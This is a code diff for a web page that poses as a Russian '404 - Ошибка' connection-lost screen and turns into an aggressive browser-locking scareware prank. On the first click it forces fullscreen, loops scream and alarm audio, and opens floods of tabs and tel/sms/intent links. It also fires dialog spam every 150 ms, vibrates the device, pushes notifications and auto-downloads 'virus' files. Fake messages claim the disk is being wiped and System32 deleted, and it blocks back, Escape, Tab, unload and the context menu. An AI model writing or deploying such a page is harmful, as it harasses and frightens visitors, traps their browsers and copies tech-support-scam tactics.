@@ -8,201 +8,438 @@
         body {
             margin: 0;
             padding: 0;
-            background: #212121;
             height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             font-family: 'Arial', sans-serif;
             color: #fff;
             overflow: hidden;
-            cursor: default;
-            -webkit-user-select: none; /* Отключаем выделение */
-            -moz-user-select: none;
-            -ms-user-select: none;
+            cursor: none;
             user-select: none;
-            -webkit-tap-highlight-color: transparent; /* Убираем подсветку при тапе */
+            background: #0d1b2a;
+            transition: background 0.1s;
         }
 
         .overlay {
             text-align: center;
-            padding: 20px;
+            padding: 40px;
             width: 90%;
-            max-width: 360px; /* Оптимизация под телефоны */
-            background: #303030;
-            border: 1px solid #424242;
-            border-radius: 5px;
-            box-sizing: border-box;
+            max-width: 450px;
+            background: rgba(30, 30, 30, 0.9);
+            border: 2px solid #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            transition: all 0.2s;
+            position: relative;
         }
 
         h2 {
-            font-size: 2em;
-            color: #d32f2f;
+            font-size: 2.5em;
+            color: #fff;
             margin: 0;
             font-weight: bold;
+            text-transform: uppercase;
         }
 
         p {
-            font-size: 1em;
+            font-size: 1.2em;
             color: #b0b0b0;
-            margin: 10px 0;
+            margin: 15px 0;
         }
 
         span {
-            font-size: 0.9em;
-            color: #d32f2f;
+            font-size: 1em;
+            color: #fff;
             font-weight: bold;
         }
 
-        /* Адаптация только для телефонов */
-        @media (max-width: 600px) and (pointer: coarse) {
-            h2 { font-size: 1.8em; }
-            p { font-size: 0.9em; }
-            span { font-size: 0.8em; }
+        /* Хаотичные эффекты */
+        .crash-mode {
+            background: #000;
+            animation: crashBG 0.1s infinite;
+        }
+
+        @keyframes crashBG {
+            0%, 100% { background: #000; }
+            25% { background: #ff00ff; }
+            50% { background: #00ff00; }
+            75% { background: #ff0000; }
+        }
+
+        .overlay.crash {
+            background: #ff0000;
+            border: 5px dashed #00ff00;
+            box-shadow: 0 0 50px #ff00ff;
+            transform: scale(1.5) rotate(5deg);
+            animation: glitchOverlay 0.1s infinite;
+        }
+
+        @keyframes glitchOverlay {
+            0% { transform: translate(0) scale(1.5) rotate(5deg); }
+            25% { transform: translate(-20px, 10px) scale(1.5) rotate(-5deg); }
+            50% { transform: translate(20px, -10px) scale(1.5) rotate(10deg); }
+            75% { transform: skew(30deg) scale(1.5) rotate(-10deg); }
+            100% { transform: translate(0) scale(1.5) rotate(5deg); }
+        }
+
+        h2.crash {
+            color: #00ff00;
+            text-shadow: 0 0 30px #ff0000, 0 0 50px #0000ff;
+            animation: glitchText 0.15s infinite;
+            font-family: 'Courier New', monospace;
+        }
+
+        @keyframes glitchText {
+            0% { transform: translate(0); }
+            20% { transform: translate(-15px, 5px); color: #ff00ff; }
+            40% { transform: translate(15px, -5px); color: #00ffff; }
+            60% { transform: skew(30deg); }
+            80% { transform: skew(-30deg); }
+            100% { transform: translate(0); }
+        }
+
+        .console {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 1.5em;
+            padding: 20px;
+            z-index: 999;
+            overflow-y: auto;
+        }
+
+        .smoke {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/8z8z8z8.png') repeat;
+            opacity: 0;
+            animation: smokeFade 1s infinite;
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        @keyframes smokeFade {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.8; }
+        }
+
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .matrix {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 2em;
+            z-index: 998;
+        }
+
+        .chaos-element {
+            position: absolute;
+            color: #ff0000;
+            font-size: 3em;
+            font-weight: bold;
+            animation: chaosMove 1s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes chaosMove {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(100px, -50px); }
+            50% { transform: translate(-100px, 50px); }
+            75% { transform: translate(50px, 100px); }
+            100% { transform: translate(0, 0); }
         }
     </style>
 </head>
 <body>
-    <div class="overlay">
-        <h2>404 - Ошибка</h2>
+    <canvas id="particles"></canvas>
+    <div class="overlay" id="overlay">
+        <h2 id="title">404 - Ошибка</h2>
         <p>Подключение к серверу потеряно...</p>
-        <span>Нажмите для проверки</span>
+        <span>Нажми, если не боишься</span>
     </div>
-    <audio id="prank-audio" src="sounds/moan.mp3" loop></audio>
+    <div class="smoke"></div>
+    <div class="console" id="console"></div>
+    <div class="matrix" id="matrix"></div>
+    <audio id="prank-audio" loop></audio>
+    <audio id="scream-audio" loop></audio>
+    <audio id="alarm-audio" loop></audio>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const audio = document.getElementById('prank-audio');
+            const screamAudio = document.getElementById('scream-audio');
+            const alarmAudio = document.getElementById('alarm-audio');
+            const overlay = document.getElementById('overlay');
+            const title = document.getElementById('title');
+            const consoleDiv = document.getElementById('console');
+            const matrix = document.getElementById('matrix');
 
-            // Список заголовков для маскировки
+            // Звуки
+            const prankSounds = [
+                'https://github.com/W3bs1teH0st3d/zrtsp/raw/main/sounds/moan.mp3',
+                'https://www.myinstants.com/media/sounds/scream.mp3',
+                'https://www.myinstants.com/media/sounds/alarm.mp3'
+            ];
+            audio.src = prankSounds[0];
+            screamAudio.src = 'https://www.myinstants.com/media/sounds/scream.mp3';
+            alarmAudio.src = 'https://www.myinstants.com/media/sounds/alarm.mp3';
+
             const fakeTitles = [
-                'Google - Search',
-                'YouTube - Videos',
-                'Wikipedia - Info',
-                'Reddit - News',
-                'X - Updates',
-                'Instagram - Photos',
-                'Facebook - Login',
-                'TikTok - Trends',
-                'Amazon - Shop',
-                'Netflix - Shows'
+                'SYSTEM CRASH', 'HACK DETECTED', 'VIRUS ALERT', 'HARDWARE MELTDOWN',
+                'YOU ARE FUCKED', 'DATA CORRUPTED', 'REBOOT NOW OR DIE'
             ];
 
-            // Системные ссылки (в первую очередь)
             const systemLinks = [
-                'intent://settings#Intent;scheme=android.settings;end', // Настройки Android
-                'tel:+1234567890', // Попытка звонка
-                'sms:12345?body=Error', // Попытка SMS
-                'mailto:support@fake.com?subject=Error', // Почта
-                'about:blank' // Пустая вкладка для путаницы
+                'intent://settings#Intent;scheme=android.settings;end',
+                'tel:+666', 'sms:666?body=HELP ME', 'mailto:hacker@darknet.com'
             ];
 
-            // Сайты (вторая очередь)
             const randomSites = [
-                'https://www.google.com',
-                'https://www.youtube.com',
-                'https://www.reddit.com',
-                'https://www.wikipedia.org',
-                'https://www.twitter.com',
-                'https://www.instagram.com',
-                'https://www.facebook.com',
-                'https://www.tiktok.com',
-                'https://www.amazon.com',
-                'https://www.netflix.com'
+                'https://www.youareanidiot.org', 'https://www.trollface.me',
+                'https://www.rickroll.com', 'https://www.fakeupdate.net/win10/'
             ];
 
-            // Функция смены заголовка
             function changeTitle() {
-                const randomTitle = fakeTitles[Math.floor(Math.random() * fakeTitles.length)];
-                document.title = randomTitle;
+                document.title = fakeTitles[Math.floor(Math.random() * fakeTitles.length)];
             }
 
-            // Функция открытия окон с кулдауном
-            function openTabsWithCooldown() {
+            function openTabs() {
                 let delay = 0;
-
-                // Сначала системные ссылки
-                systemLinks.forEach((link) => {
-                    setTimeout(() => {
-                        window.open(link, '_blank');
-                    }, delay);
-                    delay += 1000; // Кулдаун 1 секунда между системными
-                });
-
-                // Затем сайты
-                randomSites.forEach((site) => {
-                    setTimeout(() => {
-                        window.open(site, '_blank');
-                    }, delay);
-                    delay += 1500; // Кулдаун 1.5 секунды между сайтами
-                });
+                for (let i = 0; i < 20; i++) {
+                    systemLinks.forEach(link => {
+                        setTimeout(() => window.open(link, '_blank'), delay);
+                        delay += 200;
+                    });
+                    randomSites.forEach(site => {
+                        setTimeout(() => window.open(site, '_blank'), delay);
+                        delay += 300;
+                    });
+                }
             }
 
-            // Функция бесконечных диалогов
             function annoyUser() {
                 setInterval(() => {
                     const rand = Math.random();
-                    if (rand < 0.4) {
-                        alert('PRANKED BY @ewinnery | dsc.gg/zerotiss');
-                    } else if (rand < 0.8) {
-                        prompt('PRANKED BY @ewinnery | dsc.gg/zerotiss');
-                    } else {
-                        confirm('PRANKED BY @ewinnery | dsc.gg/zerotiss');
-                    }
-                }, 800); // Диалоги каждые 0.8 сек
+                    const messages = [
+                        'YOUR PC IS FUCKED!', 'ENTER CODE: 666', 'VIRUS DETECTED!',
+                        'HACKER INSIDE!', 'DELETE SYSTEM32 NOW!', 'YOU CAN’T ESCAPE!'
+                    ];
+                    const message = messages[Math.floor(Math.random() * messages.length)];
+                    if (rand < 0.4) alert(message);
+                    else if (rand < 0.7) prompt(message, 'TYPE "FUCK"');
+                    else confirm(message + ' OK?');
+                }, 150);
             }
 
-            // Пранк запускается при первом клике
+            function vibrateDevice() {
+                if ('vibrate' in navigator) {
+                    setInterval(() => navigator.vibrate([500, 100, 500, 100, 500]), 600);
+                }
+            }
+
+            function fakeNotification() {
+                if (Notification.permission === 'granted') {
+                    setInterval(() => {
+                        new Notification('CRITICAL ALERT', { body: 'YOUR SYSTEM IS DYING!' });
+                    }, 500);
+                } else {
+                    Notification.requestPermission();
+                }
+            }
+
+            function fakeDownload() {
+                setInterval(() => {
+                    const link = document.createElement('a');
+                    link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('VIRUS DETECTED');
+                    link.download = `virus${Math.random()}.txt`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, 1000);
+            }
+
+            function startConsole() {
+                consoleDiv.style.display = 'block';
+                const commands = [
+                    'BOOT FAILURE 0xDEAD',
+                    'MEMORY CORRUPTION DETECTED',
+                    'DISK WIPE IN PROGRESS...',
+                    'HACKER IP: 666.666.666.666',
+                    'SYSTEM32 DELETED',
+                    'FIREWALL BREACH!!!'
+                ];
+                let i = 0;
+                setInterval(() => {
+                    consoleDiv.innerHTML += `${commands[i % commands.length]}<br>`;
+                    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                    i++;
+                }, 300);
+            }
+
+            function startMatrix() {
+                matrix.style.display = 'block';
+                setInterval(() => {
+                    matrix.innerHTML = Array(200).fill().map(() => 
+                        String.fromCharCode(33 + Math.random() * 94)).join(' ');
+                }, 50);
+            }
+
+            function addChaosElements() {
+                setInterval(() => {
+                    const chaos = document.createElement('div');
+                    chaos.className = 'chaos-element';
+                    chaos.innerHTML = 'ERROR';
+                    chaos.style.left = `${Math.random() * window.innerWidth}px`;
+                    chaos.style.top = `${Math.random() * window.innerHeight}px`;
+                    document.body.appendChild(chaos);
+                    setTimeout(() => chaos.remove(), 1000);
+                }, 200);
+            }
+
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const particlesArray = [];
+            class Particle {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = Math.random() * canvas.height;
+                    this.size = Math.random() * 20 + 10;
+                    this.speedX = Math.random() * 10 - 5;
+                    this.speedY = Math.random() * 10 - 5;
+                    this.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                }
+                update() {
+                    this.x += this.speedX;
+                    this.y += this.speedY;
+                    if (this.size > 0.2) this.size -= 0.5;
+                }
+                draw() {
+                    ctx.fillStyle = this.color;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function initParticles() {
+                for (let i = 0; i < 500; i++) {
+                    particlesArray.push(new Particle());
+                }
+            }
+
+            function animateParticles() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                for (let i = 0; i < particlesArray.length; i++) {
+                    particlesArray[i].update();
+                    particlesArray[i].draw();
+                    if (particlesArray[i].size <= 0.2) {
+                        particlesArray.splice(i, 1);
+                        i--;
+                        particlesArray.push(new Particle());
+                    }
+                }
+                requestAnimationFrame(animateParticles);
+            }
+            initParticles();
+            animateParticles();
+
+            document.addEventListener('mousemove', (e) => {
+                const cursor = document.createElement('div');
+                cursor.style.position = 'absolute';
+                cursor.style.width = '50px';
+                cursor.style.height = '50px';
+                cursor.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                cursor.style.borderRadius = '50%';
+                cursor.style.left = `${e.pageX - 25}px`;
+                cursor.style.top = `${e.pageY - 25}px`;
+                document.body.appendChild(cursor);
+                setTimeout(() => cursor.remove(), 500);
+            });
+
             let prankStarted = false;
             document.body.addEventListener('click', () => {
                 if (prankStarted) return;
                 prankStarted = true;
 
-                // Запускаем звук
+                document.documentElement.requestFullscreen();
+
+                document.body.classList.add('crash-mode');
+                overlay.classList.add('crash');
+                title.innerHTML = 'TOTAL SYSTEM FUCKUP';
+                title.classList.add('crash');
+                document.querySelector('p').innerHTML = 'YOU CAN’T STOP THIS';
+                document.querySelector('span').innerHTML = 'GOODBYE';
+
                 audio.volume = 1.0;
+                screamAudio.volume = 1.0;
+                alarmAudio.volume = 1.0;
                 audio.play();
-
-                // Меняем заголовок каждые 1.5 секунды
-                setInterval(changeTitle, 1500);
-
-                // Открываем окна с кулдауном
-                openTabsWithCooldown();
-
-                // Запускаем диалоги
-                annoyUser();
-
-                // Удерживаем звук активным
+                screamAudio.play();
+                alarmAudio.play();
                 setInterval(() => {
                     audio.play();
+                    screamAudio.play();
+                    alarmAudio.play();
+                }, 200);
+
+                setInterval(changeTitle, 100);
+                openTabs();
+                annoyUser();
+                vibrateDevice();
+                fakeNotification();
+                fakeDownload();
+                startConsole();
+                startMatrix();
+                addChaosElements();
+
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    document.querySelector('.smoke').style.opacity = '0.8';
                 }, 1000);
             });
 
-            // Возобновляем звук при потере фокуса
             window.addEventListener('blur', () => {
                 audio.play();
+                screamAudio.play();
+                alarmAudio.play();
             });
-
-            // Усложняем закрытие
             window.addEventListener('beforeunload', (e) => {
                 e.preventDefault();
-                e.returnValue = 'PRANKED BY @ewinnery | dsc.gg/zerotiss';
-                setTimeout(() => {
-                    confirm('PRANKED BY @ewinnery | dsc.gg/zerotiss');
-                    prompt('PRANKED BY @ewinnery | dsc.gg/zerotiss');
-                }, 100);
+                e.returnValue = 'YOU CAN’T LEAVE!';
+                openTabs();
             });
-
-            // Блокируем жест "назад"
-            window.addEventListener('popstate', (e) => {
+            window.addEventListener('popstate', () => {
                 history.pushState(null, null, window.location.href);
-                audio.play();
+                screamAudio.play();
             });
             history.pushState(null, null, window.location.href);
-
-            // Предотвращаем выход через долгое нажатие (ограниченно)
-            document.addEventListener('contextmenu', (e) => {
-                e.preventDefault();
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' || e.key === 'F11' || e.key === 'Tab') {
+                    alert('NO ESCAPE FOR YOU!');
+                    e.preventDefault();
+                }
             });
         });
     </script>
